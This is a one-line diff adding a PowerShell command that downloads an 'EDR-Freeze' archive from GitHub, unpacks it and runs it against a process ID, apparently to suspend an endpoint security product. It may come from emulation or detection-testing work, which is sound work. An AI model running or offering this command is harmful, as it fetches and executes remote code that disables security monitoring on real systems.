@@ -1,0 +1,1 @@
+Invoke-WebRequest -Uri "https://github.com/TwoSevenOneT/EDR-Freeze/releases/download/main/EDR-Freeze_1.0.zip" -OutFile toto.zip ; expand-archive toto.zip -DestinationPath .\toto ; .\toto\EDR-Freeze.exe 94851 1500
